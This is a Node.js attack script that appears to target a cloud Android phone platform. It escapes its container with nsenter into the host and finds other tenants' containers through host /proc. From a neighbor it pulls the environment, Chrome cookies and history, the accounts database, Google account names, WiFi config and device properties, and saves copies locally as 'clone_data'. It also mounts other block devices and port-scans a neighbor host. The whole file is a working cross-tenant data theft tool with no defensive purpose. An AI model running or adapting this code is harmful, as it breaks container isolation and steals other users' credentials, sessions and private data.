#!/usr/bin/env node
/**
 * Get ONE neighbor device and develop extraction method
 * Target neighbor: first reachable host on 10.0.96.x (not .174 = us)
 * 
 * Methods to try:
 *  A. nsenter host → scan host /proc for other container PIDs + environments
 *  B. Device-mapper → mount other dm-* block devices (other container roots/data)
 *  C. Host cgroup → find all container cgroup paths → read their data
 *  D. /proc/<pid>/root → access other container filesystem via /proc
 *  E. Direct nc/curl probes on non-standard ports found on neighbor
 */

const path = require('path');
const fs = require('fs');

const { AK, SK, HOST, SVC, CT, SHD, hmacSign, api, sh } = require('../shared/vmos_api');
const PAD = 'ACP250923JS861KJ';
const R = { ts: new Date().toISOString(), methods: {} };

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  console.log('═'.repeat(70));
  console.log('  GET ONE NEIGHBOR — DEVELOP EXTRACTION METHOD');
  console.log('═'.repeat(70));

  // ─── METHOD A: HOST /proc — Find ALL container PIDs ────────────
  console.log('\n▶ METHOD A: nsenter host → scan /proc for neighbor containers');
  
  // Find ALL processes with PREBOOT_ENV (each container has its own init PID)
  log('A1: Find all container init processes on host...');
  const hostProcs = await run([
    'nsenter -t 1 -m -u -i -n -p -- sh -c "',
    'for pid in $(ls /proc/ 2>/dev/null | grep -E \\"^[0-9]+$\\" | head -200); do',
    '  env=$(cat /proc/$pid/environ 2>/dev/null | tr \\"\\\\0\\" \\"\\n\\" | grep pad_code 2>/dev/null)',
    '  if [ -n \\"$env\\" ]; then',
    '    comm=$(cat /proc/$pid/comm 2>/dev/null)',
    '    echo \\"CONTAINER_PID:$pid COMM:$comm ENV:$env\\"',
    '  fi',
    'done"',
  ].join('\n'), 30);
  R.methods.A_host_procs = hostProcs;
  log(`  Result: ${hostProcs.split('\n').length} lines`);
  for (const l of hostProcs.split('\n')) { if (l.includes('CONTAINER_PID')) log(`  ${l}`); }

  // Parse neighbor PIDs (exclude our pad_code)
  const containerPids = [];
  for (const line of hostProcs.split('\n')) {
    const pidMatch = line.match(/CONTAINER_PID:(\d+)/);
    const padMatch = line.match(/pad_code=(\w+)/);
    if (pidMatch && padMatch && padMatch[1] !== PAD && padMatch[1] !== 'ACP251008GUOEEHB') {
      containerPids.push({ pid: pidMatch[1], padCode: padMatch[1], line });
    }
  }
  log(`  Found ${containerPids.length} NEIGHBOR container(s)`);

  // If we found neighbor containers via /proc
  if (containerPids.length > 0) {
    const neighbor = containerPids[0];
    log(`\n  ★ TARGET NEIGHBOR: PID=${neighbor.pid} PAD=${neighbor.padCode}`);
    R.methods.target_neighbor = neighbor;

    // A2: Read neighbor's full PREBOOT_ENV
    log('A2: Extract neighbor full environment...');
    const nEnv = await run(`nsenter -t 1 -m -u -i -n -p -- cat /proc/${neighbor.pid}/environ 2>/dev/null | tr "\\0" "\\n"`, 15);
    R.methods.A_neighbor_env = nEnv;
    for (const l of nEnv.split('\n').slice(0, 10)) { if (l.trim()) log(`    ${l.slice(0, 120)}`); }

    // A3: Access neighbor filesystem via /proc/<pid>/root
    log('A3: Access neighbor filesystem via /proc/PID/root...');
    const nRoot = await run(`nsenter -t 1 -m -u -i -n -p -- ls /proc/${neighbor.pid}/root/ 2>/dev/null | head -20`, 15);
    R.methods.A_neighbor_root = nRoot;
    log(`  Root: ${nRoot.split('\n').slice(0, 5).join(', ')}`);

    // A4: Read neighbor getprop equivalent (build.prop)
    log('A4: Read neighbor build.prop...');
    const nBuildProp = await run(`nsenter -t 1 -m -u -i -n -p -- cat /proc/${neighbor.pid}/root/system/build.prop 2>/dev/null | head -40`, 20);
    R.methods.A_neighbor_buildprop = nBuildProp;
    for (const l of nBuildProp.split('\n').slice(0, 10)) { if (l.trim()) log(`    ${l}`); }

    // A5: Read neighbor data directory
    log('A5: Neighbor /data directory...');
    const nData = await run(`nsenter -t 1 -m -u -i -n -p -- ls /proc/${neighbor.pid}/root/data/data/ 2>/dev/null | head -30`, 15);
    R.methods.A_neighbor_data = nData;
    log(`  Apps: ${nData.split('\n').length} packages`);
    for (const l of nData.split('\n').slice(0, 8)) log(`    ${l}`);

    // A6: Extract neighbor Chrome cookies
    log('A6: Neighbor Chrome cookies...');
    const nChrome = await run(`nsenter -t 1 -m -u -i -n -p -- base64 /proc/${neighbor.pid}/root/data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null | head -200`, 20);
    R.methods.A_neighbor_chrome_cookies_b64_len = nChrome.length;
    log(`  Chrome cookies: ${nChrome.length} b64 chars`);

    // A7: Extract neighbor Chrome history
    log('A7: Neighbor Chrome history...');
    const nHistory = await run(`nsenter -t 1 -m -u -i -n -p -- base64 /proc/${neighbor.pid}/root/data/data/com.android.chrome/app_chrome/Default/History 2>/dev/null | head -200`, 20);
    R.methods.A_neighbor_chrome_history_b64_len = nHistory.length;
    log(`  Chrome history: ${nHistory.length} b64 chars`);

    // A8: Extract neighbor accounts DB
    log('A8: Neighbor accounts_ce.db...');
    const nAccounts = await run(`nsenter -t 1 -m -u -i -n -p -- base64 /proc/${neighbor.pid}/root/data/system_ce/0/accounts_ce.db 2>/dev/null | head -300`, 20);
    R.methods.A_neighbor_accounts_b64_len = nAccounts.length;
    log(`  accounts_ce.db: ${nAccounts.length} b64 chars`);

    // A9: Neighbor Google account info
    log('A9: Neighbor Google accounts...');
    const nGoog = await run(`nsenter -t 1 -m -u -i -n -p -- sh -c "sqlite3 /proc/${neighbor.pid}/root/data/system_ce/0/accounts_ce.db 'SELECT name,type FROM accounts;' 2>/dev/null || echo NO_SQLITE3"`, 15);
    R.methods.A_neighbor_google = nGoog;
    log(`  Accounts: ${nGoog}`);

    // A10: Neighbor WiFi config
    log('A10: Neighbor WiFi config...');
    const nWifi = await run(`nsenter -t 1 -m -u -i -n -p -- cat /proc/${neighbor.pid}/root/data/misc/wifi/WifiConfigStore.xml 2>/dev/null | head -30`, 15);
    R.methods.A_neighbor_wifi = nWifi;
    if (nWifi.length > 10) log(`  WiFi: ${nWifi.split('\n')[0].slice(0, 80)}`);

    // A11: Neighbor proxy config
    log('A11: Neighbor proxy config (from props)...');
    const nProxy = await run(`nsenter -t 1 -m -u -i -n -p -- sh -c "cat /proc/${neighbor.pid}/root/data/property/persistent_properties 2>/dev/null | strings | grep -i proxy | head -10"`, 15);
    R.methods.A_neighbor_proxy = nProxy;
    log(`  Proxy: ${nProxy || 'none found in persistent_properties'}`);

    // A12: Neighbor device properties (all persist.* and ro.*)
    log('A12: Neighbor device identity props...');
    const nProps = await run(`nsenter -t 1 -m -u -i -n -p -- sh -c "strings /proc/${neighbor.pid}/root/data/property/persistent_properties 2>/dev/null | head -50"`, 20);
    R.methods.A_neighbor_props = nProps;
    for (const l of nProps.split('\n').slice(0, 15)) { if (l.trim()) log(`    ${l}`); }

    // A13: Neighbor GMS databases
    log('A13: Neighbor GMS databases...');
    const nGms = await run(`nsenter -t 1 -m -u -i -n -p -- ls -la /proc/${neighbor.pid}/root/data/data/com.google.android.gms/databases/ 2>/dev/null | head -15`, 15);
    R.methods.A_neighbor_gms = nGms;
    for (const l of nGms.split('\n').slice(0, 5)) log(`    ${l}`);

    // A14: Neighbor installed apps with sizes
    log('A14: Neighbor app data sizes...');
    const nAppSizes = await run(`nsenter -t 1 -m -u -i -n -p -- sh -c "du -sk /proc/${neighbor.pid}/root/data/data/* 2>/dev/null | sort -rn | head -20"`, 20);
    R.methods.A_neighbor_app_sizes = nAppSizes;
    for (const l of nAppSizes.split('\n').slice(0, 10)) log(`    ${l}`);

    // Save all extracted data locally
    const saveDir = path.join(__dirname, '..', 'output', 'clone_data');
    if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });
    
    if (nChrome.length > 10 && !nChrome.startsWith('[')) {
      fs.writeFileSync(`${saveDir}/neighbor_chrome_cookies.b64`, nChrome);
      log(`  Saved: neighbor_chrome_cookies.b64`);
    }
    if (nHistory.length > 10 && !nHistory.startsWith('[')) {
      fs.writeFileSync(`${saveDir}/neighbor_chrome_history.b64`, nHistory);
      log(`  Saved: neighbor_chrome_history.b64`);
    }
    if (nAccounts.length > 10 && !nAccounts.startsWith('[')) {
      fs.writeFileSync(`${saveDir}/neighbor_accounts_ce.b64`, nAccounts);
      log(`  Saved: neighbor_accounts_ce.b64`);
    }
    if (nProps) fs.writeFileSync(`${saveDir}/neighbor_props.txt`, nProps);
    if (nEnv) fs.writeFileSync(`${saveDir}/neighbor_env.txt`, nEnv);
    if (nBuildProp) fs.writeFileSync(`${saveDir}/neighbor_build_prop.txt`, nBuildProp);
    if (nWifi.length > 10) fs.writeFileSync(`${saveDir}/neighbor_wifi.xml`, nWifi);

    log(`\n  ★ NEIGHBOR ${neighbor.padCode} DATA EXTRACTION COMPLETE`);
  }

  // ─── METHOD B: Device-Mapper (if Method A didn't find containers) ──
  if (containerPids.length === 0) {
    console.log('\n▶ METHOD B: Device-mapper — mount neighbor block devices');
    
    log('B1: List all dm devices and find unmounted ones...');
    const ourMounts = await run('cat /proc/mounts | grep dm- | awk \'{print $1" "$2}\'', 10);
    R.methods.B_our_mounts = ourMounts;
    log(`  Our mounts:\n${ourMounts}`);

    const ourDmNums = new Set();
    for (const m of ourMounts.split('\n')) {
      const dm = m.match(/dm-(\d+)/);
      if (dm) ourDmNums.add(parseInt(dm[1]));
    }

    // Try mounting dm-0 through dm-5 (likely other containers or host)
    for (let i = 0; i <= 5; i++) {
      if (ourDmNums.has(i)) continue;
      
      log(`B2: Try mount dm-${i}...`);
      await run('mkdir -p /data/local/tmp/nb_mount 2>/dev/null', 5);
      
      // Try ext4
      const ext4 = await run(`mount -t ext4 -o ro /dev/block/dm-${i} /data/local/tmp/nb_mount 2>&1; echo EXIT=$?`, 15);
      if (ext4.includes('EXIT=0')) {
        const ls = await run('ls /data/local/tmp/nb_mount/ 2>/dev/null', 10);
        log(`  dm-${i} ext4: ${ls.split('\n').slice(0, 3).join(', ')}`);
        R.methods[`B_dm${i}_ext4`] = ls;
        
        // Check for Android data
        const hasData = await run('ls /data/local/tmp/nb_mount/data/ 2>/dev/null | head -5', 10);
        if (hasData && !hasData.startsWith('[')) {
          log(`  ★ dm-${i} HAS /data: ${hasData}`);
          R.methods[`B_dm${i}_data`] = hasData;
        }
        await run('umount /data/local/tmp/nb_mount 2>/dev/null', 10);
        continue;
      }
      
      // Try f2fs
      const f2fs = await run(`mount -t f2fs -o ro /dev/block/dm-${i} /data/local/tmp/nb_mount 2>&1; echo EXIT=$?`, 15);
      if (f2fs.includes('EXIT=0')) {
        const ls = await run('ls /data/local/tmp/nb_mount/ 2>/dev/null', 10);
        log(`  dm-${i} f2fs: ${ls.split('\n').slice(0, 3).join(', ')}`);
        R.methods[`B_dm${i}_f2fs`] = ls;
        await run('umount /data/local/tmp/nb_mount 2>/dev/null', 10);
      }
      
      await sleep(200);
    }
  }

  // ─── METHOD C: Network — deeper port probes on nearest neighbor ──
  console.log('\n▶ METHOD C: Deep network probe on nearest neighbor');
  const NEIGHBOR_IP = '10.0.96.1';
  
  log(`C1: Extended port scan on ${NEIGHBOR_IP}...`);
  const deepPorts = await run([
    `for p in 5555 5037 8779 23333 23334 8080 9090 2375 4222 4243 6379 3306 5432 27017 2222 22222 10000 15555 20000 30000 40000 50000; do`,
    `  (echo >/dev/tcp/${NEIGHBOR_IP}/$p 2>/dev/null && echo "OPEN:$p") &`,
    `done; wait`,
  ].join('\n'), 15);
  R.methods.C_ports = deepPorts;
  const openPorts = (deepPorts.match(/OPEN:\d+/g) || []).map(p => p.split(':')[1]);
  log(`  Open ports: ${openPorts.length > 0 ? openPorts.join(', ') : 'NONE'}`);

  // Try armcloud agent port on neighbor
  log(`C2: Try armcloud agent on neighbor ${NEIGHBOR_IP}:8779...`);
  const nbAgent = await run(`curl -s -m5 http://${NEIGHBOR_IP}:8779/info 2>/dev/null || echo UNREACHABLE`, 10);
  R.methods.C_neighbor_agent = nbAgent;
  log(`  Agent: ${nbAgent.slice(0, 80)}`);

  // ─── SAVE REPORT ──────────────────────────────────────────────
  const reportFile = `${path.join(__dirname, '..', 'reports')}/GET_NEIGHBOR_${Date.now()}.json`;
  fs.writeFileSync(reportFile, JSON.stringify(R, null, 2));

  // ─── SUMMARY ──────────────────────────────────────────────────
  console.log('\n' + '═'.repeat(70));
  console.log('  RESULTS');
  console.log('═'.repeat(70));
  if (containerPids.length > 0) {
    console.log(`  ✓ METHOD A SUCCEEDED: Found ${containerPids.length} neighbor container(s)`);
    for (const c of containerPids) console.log(`    PAD: ${c.padCode} (PID ${c.pid})`);
    console.log(`  Data extracted to: clone_data/`);
  } else {
    console.log('  ✗ Method A: No neighbor containers found via host /proc');
  }
  console.log(`  Method B: DM mount results in report`);
  console.log(`  Method C: Network ports = ${openPorts.length > 0 ? openPorts.join(',') : 'all closed'}`);
  console.log(`  Report: ${reportFile}`);
  console.log('═'.repeat(70));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
